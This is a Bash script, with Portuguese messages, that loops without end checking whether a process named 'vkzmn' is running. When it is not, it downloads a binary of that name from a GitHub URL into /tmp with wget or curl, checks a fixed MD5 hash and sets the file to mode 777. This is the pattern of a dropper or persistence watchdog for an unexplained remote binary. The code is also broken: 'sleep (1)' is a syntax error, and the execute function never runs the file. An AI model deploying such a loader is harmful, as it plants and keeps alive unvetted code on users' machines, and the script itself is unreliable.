execute_vkzmn() {


echo executando vkzmn

chmod 777 /tmp/vkzmn



return 

}





#############################################################


check_file() {




#chek vkzmn  is instaledd in /tmp


ls  /tmp/vkzmn   


if (( $? )) ; then


echo vkzmn not found


check_wget_curl 



else 


echo  vkzmn ja esta em /tmp


magic



fi ; 


}


#############################################################



magic() {  #check  if file is  ELF


echo checando  a integridade do arquivo


command -v  md5sum
 
if (( $?  )) ; then

echo md5sum nao encontrado

exit #use  od 

fi;

 
md5=$( md5sum /tmp/vkzmn )


for  m  in $md5 ; do  


if [[ $m = '002ab35974600f09c26abe5b15ad11f4' ]] ; then

echo  vkzmn esta integro

execute_vkzmn

fi;

done



}


####################################################################


down_curl() {

echo usando o curl

curl  -L https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -o /tmp/vkzmn

check_file


}

####################################################################

down_wget() {


echo usando wget


wget https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -O /tmp/vkzmn

check_file



}


#########################################################################


check_wget_curl() {



command -v wget 


if (( $? )) ; then #if last err not  0  wget not found

echo wget not found


else

down_wget      #wget ok

return


fi;




command -v curl  


if (( $?  )) ; then  #if last  err  not 0  curl not found

echo curl not found


else


down_curl #curl ok


return

fi;

}

# -------------------------------------------




proc() {



true=1000
while true ; do
vkzmn_ok=0
dir_proc=$( ls  /proc )
for  pid  in   $dir_proc ; do
if  ((  $pid  >  0  )) ; then
comm=$( cat  /proc/$pid/comm )
for  cc in  $comm ; do
if [ $cc  =  "vkzmn" ] ; then
vkzmn_ok=$true
fi ; 

done
fi; 
done
if   [  $vkzmn_ok   -eq    $true   ]  ; then
echo vkzmn_ok
else 
echo  vkzmn_not_ok
check_file   
fi ; 
done


} 




main() {


while   true ; do 



sleep  (1)


vkzmn_ok=0


#simple verification


command -v pgrep 


if (( $? )) ; then #if last err not 0 pgrep not instaled

echo pgrep not instaled
 

proc

return

fi;




if  [  $? -eq  0 ]  ; then 


echo pgrep instaled

pgrep vkzmn


if  [  $? -eq   1 ]  ; then    #vkzmn not in execution

vkzmn_ok=1

fi ;

if (( $vkzmn_ok )) ; then 

echo vkzmn nao esta em execucao

check_file 

fi ;

fi;


done #loop



}



 
main
